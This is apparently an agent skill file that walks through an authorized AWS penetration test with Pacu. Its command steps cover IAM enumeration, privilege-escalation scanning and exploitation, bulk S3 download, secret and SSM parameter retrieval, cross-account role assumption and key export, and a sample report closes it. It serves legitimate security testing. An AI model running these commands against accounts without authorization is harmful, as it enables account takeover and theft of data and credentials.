---
name: performing-cloud-penetration-testing-with-pacu
description: >
  Performing authorized AWS penetration testing using Pacu, the open-source AWS exploitation
  framework, to enumerate IAM configurations, discover privilege escalation paths, test
  credential harvesting, and validate security controls through systematic attack simulation.
domain: cybersecurity
subdomain: cloud-security
tags: [cloud-security, aws, pacu, penetration-testing, offensive-security, iam-exploitation]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing Cloud Penetration Testing with Pacu

## When to Use

- When conducting authorized penetration testing of AWS environments
- When validating the effectiveness of IAM policies, SCPs, and permission boundaries
- When assessing the blast radius of a compromised set of AWS credentials
- When testing detection capabilities of GuardDuty, Security Hub, and custom alerting
- When building red team exercises against AWS cloud infrastructure

**Do not use** for unauthorized testing of any AWS account, for testing AWS infrastructure itself (covered by shared responsibility), for DDoS or volumetric attacks without AWS approval, or for production account testing without explicit authorization and breakglass procedures.

## Prerequisites

- Written authorization from the AWS account owner with defined scope and rules of engagement
- Pacu v1.5+ installed (`pip install pacu`)
- Test AWS credentials with limited starting permissions (simulates compromised credential scenario)
- CloudTrail logging enabled to capture all Pacu activity for post-engagement review
- GuardDuty enabled to validate detection of Pacu activities
- Emergency contact and rollback procedures documented

## Workflow

### Step 1: Initialize Pacu Session and Configure Credentials

Set up a Pacu session with the test credentials and define the engagement scope.

```bash
# Install Pacu
pip install pacu

# Start Pacu
pacu

# Create a new session for the engagement
Pacu > set_keys --key-alias pentest-target
# Enter Access Key ID: AKIA...
# Enter Secret Access Key: ...

# Verify identity
Pacu > whoami

# Review available modules
Pacu > list
Pacu > search iam
Pacu > search ec2
Pacu > search s3
```

### Step 2: Enumerate IAM Configuration

Run IAM enumeration modules to map users, roles, policies, and group memberships.

```bash
# Comprehensive IAM enumeration
Pacu > run iam__enum_users_roles_policies_groups

# Enumerate detailed permissions for the current principal
Pacu > run iam__enum_permissions

# Enumerate account authorization details (requires iam:GetAccountAuthorizationDetails)
Pacu > run iam__get_credential_report

# Enumerate role trust policies for cross-account access
Pacu > run iam__enum_roles

# Check current session data
Pacu > data iam
```

### Step 3: Scan for Privilege Escalation Paths

Use Pacu's privilege escalation scanner to identify all exploitable escalation vectors.

```bash
# Run the privilege escalation scanner
Pacu > run iam__privesc_scan

# The scanner tests for 21+ escalation methods:
# Method 1:  iam:CreatePolicyVersion
# Method 2:  iam:SetDefaultPolicyVersion
# Method 3:  iam:PassRole + ec2:RunInstances
# Method 4:  iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
# Method 5:  iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping
# Method 6:  iam:PassRole + glue:CreateDevEndpoint
# Method 7:  iam:PassRole + cloudformation:CreateStack
# Method 8:  iam:PassRole + datapipeline:CreatePipeline
# Method 9:  iam:CreateAccessKey
# Method 10: iam:CreateLoginProfile
# Method 11: iam:UpdateLoginProfile
# Method 12: iam:AttachUserPolicy
# Method 13: iam:AttachGroupPolicy
# Method 14: iam:AttachRolePolicy
# Method 15: iam:PutUserPolicy
# Method 16: iam:PutGroupPolicy
# Method 17: iam:PutRolePolicy
# Method 18: iam:AddUserToGroup
# Method 19: iam:UpdateAssumeRolePolicy
# Method 20: sts:AssumeRole
# Method 21: lambda:UpdateFunctionCode

# If escalation paths found, attempt exploitation
Pacu > run iam__privesc_scan --escalate
```

### Step 4: Enumerate and Test Data Access

Discover accessible data stores including S3, DynamoDB, RDS, and Secrets Manager.

```bash
# Enumerate S3 buckets
Pacu > run s3__bucket_finder

# Download S3 bucket data for analysis
Pacu > run s3__download_bucket --bucket target-bucket --dl-names

# Enumerate EC2 instances and extract user data
Pacu > run ec2__enum
Pacu > run ec2__download_userdata

# Enumerate Lambda functions and check for secrets in environment variables
Pacu > run lambda__enum

# Enumerate Secrets Manager
Pacu > run secretsmanager__enum

# Enumerate SSM parameters (often contain secrets)
Pacu > run ssm__download_parameters

# Check for exposed EBS snapshots
Pacu > run ebs__enum_snapshots_unauth
```

### Step 5: Test Lateral Movement and Persistence

Evaluate cross-account access, service exploitation, and persistence mechanisms.

```bash
# Test cross-account role assumption
Pacu > run sts__assume_role --role-arn arn:aws:iam::TARGET:role/CrossAccountRole

# Enumerate Lambda for code execution opportunities
Pacu > run lambda__enum
# If lambda:UpdateFunctionCode permission exists, could inject code

# Test EC2 instance connect for lateral movement
Pacu > run ec2__enum
# Check for instances with instance profiles that have broader permissions

# Check for CodeBuild projects (potential credential access)
Pacu > run codebuild__enum

# Enumerate ECS/Fargate for container-based lateral movement
Pacu > run ecs__enum

# Export all discovered data
Pacu > data all
```

### Step 6: Validate Detection and Generate Report

Review whether security controls detected the testing activities and compile findings.

```bash
# Check GuardDuty findings generated during testing
aws guardduty list-findings \
  --detector-id $(aws guardduty list-detectors --query 'DetectorIds[0]' --output text) \
  --finding-criteria '{
    "Criterion": {
      "updatedAt": {"GreaterThanOrEqual": ENGAGEMENT_START_EPOCH}
    }
  }' --output json

# Check Security Hub findings
aws securityhub get-findings \
  --filters '{
    "CreatedAt": [{"Start": "ENGAGEMENT_START_ISO", "End": "ENGAGEMENT_END_ISO"}]
  }'

# Export Pacu session data for reporting
Pacu > export_keys --all
Pacu > data all > pacu-session-export.json

# Clean up any test artifacts created during assessment
aws iam delete-user --user-name pacu-test-user 2>/dev/null
aws iam delete-access-key --user-name pacu-test-user --access-key-id AKIA... 2>/dev/null
```

## Key Concepts

| Term | Definition |
|------|------------|
| Pacu | Open-source AWS exploitation framework maintained by Rhino Security Labs, providing modular attack capabilities for authorized penetration testing |
| Privilege Escalation Scan | Automated analysis of IAM policies to identify known methods for elevating permissions from limited access to administrative control |
| iam:PassRole | Critical IAM action allowing a principal to assign roles to AWS services, enabling indirect privilege escalation through Lambda, EC2, or Glue |
| Cross-Account Role Assumption | Using sts:AssumeRole to obtain temporary credentials in another AWS account through trust policy configurations |
| Rules of Engagement | Documented agreement defining the scope, methods, timing, and boundaries of a penetration testing engagement |
| Post-Exploitation | Activities performed after initial access to demonstrate impact, including data access, lateral movement, and persistence establishment |

## Tools & Systems

- **Pacu**: AWS exploitation framework with 50+ modules for enumeration, escalation, persistence, and data exfiltration
- **CloudFox**: AWS enumeration tool for identifying attack paths from an attacker perspective
- **Principal Mapper**: IAM privilege escalation graph analysis tool for visualizing escalation paths
- **ScoutSuite**: Multi-cloud security assessment tool for identifying misconfigurations before testing
- **AWS CloudTrail**: Audit logging for capturing all Pacu activities during the engagement

## Common Scenarios

### Scenario: Red Team Assessment Starting from Compromised Developer Credentials

**Context**: A red team exercise simulates a scenario where an attacker obtains a developer's AWS access key from a leaked repository. The goal is to determine the maximum impact achievable from this starting point.

**Approach**:
1. Initialize Pacu with the compromised credentials and run `whoami` to confirm identity
2. Run `iam__enum_permissions` to map the developer's effective permissions
3. Execute `iam__privesc_scan` to identify escalation paths from developer to admin
4. Discover the developer can call `iam:PassRole` + `lambda:CreateFunction`, creating a Lambda with an admin role
5. Exploit the escalation to obtain admin-level temporary credentials
6. Enumerate S3 buckets, download sensitive data, and access Secrets Manager
7. Verify whether GuardDuty detected the escalation and data access activities
8. Clean up all test artifacts and document the complete attack chain

**Pitfalls**: Pacu modules can be noisy and generate many API calls in a short time. GuardDuty may trigger `Recon:IAMUser/MaliciousIPCaller` findings from the tester's IP. Coordinate with the SOC team to whitelist the testing IP or establish a clear communication channel to distinguish testing from real attacks. Always clean up persistence artifacts after testing.

## Output Format

```
AWS Penetration Test Report (Pacu)
=====================================
Target Account: 123456789012
Engagement Period: 2026-02-20 to 2026-02-23
Starting Credentials: Developer role (read-only S3, Lambda invoke)
Authorization: Signed ROE document #PT-2026-015

ATTACK PATH SUMMARY:
  Starting access: S3 read-only, Lambda invoke
  Maximum access achieved: AdministratorAccess (full account compromise)
  Time to admin: 47 minutes
  Detection by GuardDuty: Yes (after 12 minutes)
  Detection by Security Hub: Yes (after 18 minutes)
  SOC response time: 45 minutes (missed the escalation window)

PACU MODULES EXECUTED:
  iam__enum_users_roles_policies_groups: SUCCESS
  iam__enum_permissions: SUCCESS
  iam__privesc_scan: 3 escalation paths found
  s3__download_bucket: 4 buckets accessed
  lambda__enum: 12 functions enumerated
  secretsmanager__enum: 8 secrets retrieved

ESCALATION PATHS EXPLOITED:
  [1] iam:PassRole + lambda:CreateFunction -> AdminRole (CRITICAL)
  [2] sts:AssumeRole -> CrossAccountProdRole (HIGH)
  [3] iam:CreatePolicyVersion on dev-policy (CRITICAL)

DATA ACCESSED:
  S3 objects downloaded: 1,247 files (2.3 GB)
  Secrets Manager values: 8 secrets including DB credentials
  SSM parameters: 23 parameters including API keys

DETECTION RESULTS:
  GuardDuty findings generated: 7
  Security Hub findings: 12
  Custom CloudWatch alarms triggered: 3
  SOC acknowledged: Yes (45 min response)

RECOMMENDATIONS:
  1. Apply permission boundaries to all developer roles
  2. Remove iam:PassRole from non-admin principals
  3. Reduce SOC response time to < 15 minutes for IAM escalation alerts
  4. Implement SCP blocking iam:CreatePolicyVersion in non-admin OUs
```
